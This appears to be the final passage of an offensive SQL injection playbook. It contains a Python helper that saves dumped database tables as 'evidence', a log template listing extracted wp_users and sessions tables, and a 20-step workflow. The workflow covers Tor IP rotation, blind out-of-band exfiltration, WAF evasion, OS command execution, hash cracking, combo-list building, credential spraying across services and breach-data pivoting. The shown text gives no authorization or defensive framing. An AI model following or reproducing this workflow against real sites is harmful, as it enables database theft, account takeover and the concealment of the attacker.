    filename = f"{target}_{table_name}_{timestamp}.json"
    entry = {
        "target": target,
        "table": table_name,
        "extraction_method": method,
        "timestamp": timestamp,
        "row_count": len(data),
        "columns": list(data[0].keys()) if data else [],
        "data_hash": hashlib.sha256(json.dumps(data).encode()).hexdigest(),
        "data": data,
    }
    output_dir = Path("./evidence")
    output_dir.mkdir(exist_ok=True)
    with open(output_dir / filename, 'w') as f:
        json.dump(entry, f, indent=2)
    return filename
```

### Extraction Tracker Template
```markdown
## Extraction Log — [TARGET]

| Table | Method | Rows | Status | File |
|-------|--------|------|--------|------|
| wp_users | UNION | 37 | DONE | evidence/target_wp_users.json |
| wp_options | Boolean | 450 | DONE | evidence/target_wp_options.json |
| sessions | Time-based | 89 | DONE | evidence/target_sessions.json |
```

---

## QUICK REFERENCE — COMPLETE WORKFLOW

```
[0] Setup Tor rotation -> verify IP changes
[1] Spider target -> collect all parameters + non-obvious points
[2] First-pass payload set -> confirm SQLi (boolean/time/error)
[3] Fingerprint DB type + extended DBMS routing
[4] Check access level (user(), FILE privilege)
[5] Enumerate schema (all DBMS variants)
[6] Prioritize targets (Tier 0-3) + universal checklist
[7] Choose extraction method -> bulk extract
[8] If blind -> OOB exfiltration (MSSQL/Oracle/MySQL)
[9] Test ALL HTTP verbs (INSERT/UPDATE/DELETE injection)
[10] Check second-order injection candidates
[11] If parameterized -> check bypass scenarios
[12] WAF? -> filter-evasion ladder
[13] SQLMap automation (full workflow)
[14] If access allows -> OS command execution
[15] If blocked -> obstacle recovery table
[16] Parse dumps -> classify hashes -> build combo list
[17] Hashcat cracking (per hash type, GPU optimized)
[18] Credential reuse -> spray across all services
[19] Breach correlation -> email identity pivot
[20] Package evidence -> extraction tracker
```
